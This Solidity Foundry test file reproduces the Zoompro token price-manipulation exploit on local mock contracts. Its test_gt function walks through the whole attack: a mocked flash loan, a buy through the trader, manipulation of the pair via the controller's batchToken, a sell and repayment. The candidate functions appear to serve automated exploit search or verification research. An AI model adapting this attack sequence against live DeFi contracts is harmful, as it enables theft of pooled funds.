// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./AttackContract.sol";
import "./FUSDT.sol";
import "./Zoom.sol";
import "./ZoomController.sol";
import "./ZoomTrader.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract ZoomproTest is Test, BlockLoader {
    USDT usdt;
    Zoom zoom;
    FUSDT fusdt;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    ZoomController controller;
    ZoomTrader trader;
    AttackContract attackContract;
    address owner;
    address attacker;
    address usdtAddr;
    address zoomAddr;
    address fusdtAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address controllerAddr;
    address traderAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1662348485;
    uint112 reserve0pair = 15198754777163623656927698;
    uint112 reserve1pair = 2620645036763942583008253456483;
    uint32 blockTimestampLastpair = 1662348362;
    uint256 kLastpair = 0;
    uint256 price0CumulativeLastpair =
        195671538664465213078061739430914573726916960;
    uint256 price1CumulativeLastpair = 4327081577460269226890878866920266;
    uint256 totalSupplyusdt = 4979997922170098408283526080;
    uint256 balanceOfusdtpair = 0;
    uint256 balanceOfusdtattacker = 0;
    uint256 balanceOfusdtcontroller = 0;
    uint256 balanceOfusdttrader = 84987473365001802519581;
    uint256 totalSupplyzoom = 6666666666666000000000000000000;
    uint256 balanceOfzoompair = 2620645036763942583008253456483;
    uint256 balanceOfzoomattacker = 1;
    uint256 balanceOfzoomcontroller = 1;
    uint256 balanceOfzoomtrader = 1;
    uint256 totalSupplyfusdt = 4979997922172658408539526181;
    uint256 balanceOffusdtpair = 15198754777163623656927698;
    uint256 balanceOffusdtattacker = 1;
    uint256 balanceOffusdtcontroller = 1000000000000000000000000;
    uint256 balanceOffusdttrader = 10015014526634998197480419;

    function setUp() public {
        owner = address(this);
        usdt = new USDT();
        usdtAddr = address(usdt);
        zoom = new Zoom();
        zoomAddr = address(zoom);
        fusdt = new FUSDT();
        fusdtAddr = address(fusdt);
        pair = new UniswapV2Pair(
            address(fusdt),
            address(zoom),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        controller = new ZoomController(address(pair));
        controllerAddr = address(controller);
        trader = new ZoomTrader(
            address(pair),
            payable(address(router)),
            address(zoom),
            address(usdt),
            address(fusdt)
        );
        traderAddr = address(trader);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        zoom.transfer(address(pair), balanceOfzoompair);
        fusdt.transfer(address(pair), balanceOffusdtpair);
        zoom.transfer(address(controller), balanceOfzoomcontroller);
        fusdt.transfer(address(controller), balanceOffusdtcontroller);
        usdt.transfer(address(trader), balanceOfusdttrader);
        zoom.transfer(address(trader), balanceOfzoomtrader);
        fusdt.transfer(address(trader), balanceOffusdttrader);
        zoom.transfer(address(attacker), balanceOfzoomattacker);
        fusdt.transfer(address(attacker), balanceOffusdtattacker);
        zoom.transfer(address(trader), 500000000000e18);
        fusdt.transfer(address(trader), 1000000e18);
        usdt.transfer(address(trader), 2000000e18);
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(zoom),
            address(usdt),
            zoom.decimals()
        );
        queryERC20BalanceDecimals(
            address(fusdt),
            address(usdt),
            fusdt.decimals()
        );
        emit log_string("");
        emit log_string("Zoom Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(zoom),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(zoom),
            address(zoom),
            zoom.decimals()
        );
        queryERC20BalanceDecimals(
            address(fusdt),
            address(zoom),
            fusdt.decimals()
        );
        emit log_string("");
        emit log_string("Fusdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(fusdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(zoom),
            address(fusdt),
            zoom.decimals()
        );
        queryERC20BalanceDecimals(
            address(fusdt),
            address(fusdt),
            fusdt.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(zoom),
            address(pair),
            zoom.decimals()
        );
        queryERC20BalanceDecimals(
            address(fusdt),
            address(pair),
            fusdt.decimals()
        );
        emit log_string("");
        emit log_string("Controller Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(controller),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(zoom),
            address(controller),
            zoom.decimals()
        );
        queryERC20BalanceDecimals(
            address(fusdt),
            address(controller),
            fusdt.decimals()
        );
        emit log_string("");
        emit log_string("Trader Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(trader),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(zoom),
            address(trader),
            zoom.decimals()
        );
        queryERC20BalanceDecimals(
            address(fusdt),
            address(trader),
            fusdt.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attacker),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(zoom),
            address(attacker),
            zoom.decimals()
        );
        queryERC20BalanceDecimals(
            address(fusdt),
            address(attacker),
            fusdt.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function borrow_usdt_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_owner(uint256 amount) internal eurus {
        usdt.transfer(owner, amount);
    }

    function borrow_zoom_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        zoom.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_zoom_owner(uint256 amount) internal eurus {
        zoom.transfer(owner, amount);
    }

    function borrow_fusdt_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        fusdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_fusdt_owner(uint256 amount) internal eurus {
        fusdt.transfer(owner, amount);
    }

    function borrow_usdt_trader(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(trader));
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_trader(uint256 amount) internal eurus {
        usdt.transfer(address(trader), amount);
    }

    function borrow_zoom_trader(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(trader));
        zoom.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_zoom_trader(uint256 amount) internal eurus {
        zoom.transfer(address(trader), amount);
    }

    function borrow_fusdt_trader(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(trader));
        fusdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_fusdt_trader(uint256 amount) internal eurus {
        fusdt.transfer(address(trader), amount);
    }

    function swap_pair_attacker_fusdt_zoom(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        fusdt.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_zoom_fusdt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        zoom.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function addliquidity_controller_pair_fusdt_fusdt() internal eurus {
        address[] memory n1 = new address[](1);
        n1[0] = address(pair);
        uint256[] memory n2 = new uint256[](1);
        n2[0] = fusdt.balanceOf(address(controller));
        controller.batchToken(n1, n2, address(fusdt));
        pair.sync();
    }

    function swap_trader_attacker_usdt_zoom(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        usdt.approve(address(trader), type(uint256).max);
        trader.buy(amount);
    }

    function swap_trader_attacker_zoom_usdt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        zoom.approve(address(trader), type(uint256).max);
        trader.sell(amount);
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_usdt_owner(amt0);
        swap_trader_attacker_usdt_zoom(amt1, amt2);
        swap_trader_attacker_zoom_usdt(amt3, amt4);
        payback_usdt_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_usdt_owner(amt0);
        swap_trader_attacker_usdt_zoom(amt1, amt2);
        swap_pair_attacker_fusdt_zoom(amt3, amt4);
        swap_trader_attacker_zoom_usdt(amt5, amt6);
        payback_usdt_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_usdt_owner(amt0);
        swap_trader_attacker_usdt_zoom(amt1, amt2);
        swap_pair_attacker_zoom_fusdt(amt3, amt4);
        swap_trader_attacker_zoom_usdt(amt5, amt6);
        payback_usdt_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_usdt_owner(amt0);
        swap_trader_attacker_usdt_zoom(amt1, amt2);
        addliquidity_controller_pair_fusdt_fusdt();
        swap_trader_attacker_zoom_usdt(amt3, amt4);
        payback_usdt_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_usdt_owner(3000000e18);
        printBalance("After step0 ");
        swap_trader_attacker_usdt_zoom(usdt.balanceOf(attacker), 1);
        printBalance("After step1 ");
        addliquidity_controller_pair_fusdt_fusdt();
        printBalance("After step2 ");
        swap_trader_attacker_zoom_usdt(zoom.balanceOf(attacker), 1);
        printBalance("After step3 ");
        payback_usdt_owner((3000000e18 * 1003) / 1000);
        printBalance("After step4 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_usdt_owner(amt0);
        swap_trader_attacker_usdt_zoom(amt1, amt2);
        addliquidity_controller_pair_fusdt_fusdt();
        swap_trader_attacker_zoom_usdt(amt3, amt4);
        payback_usdt_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
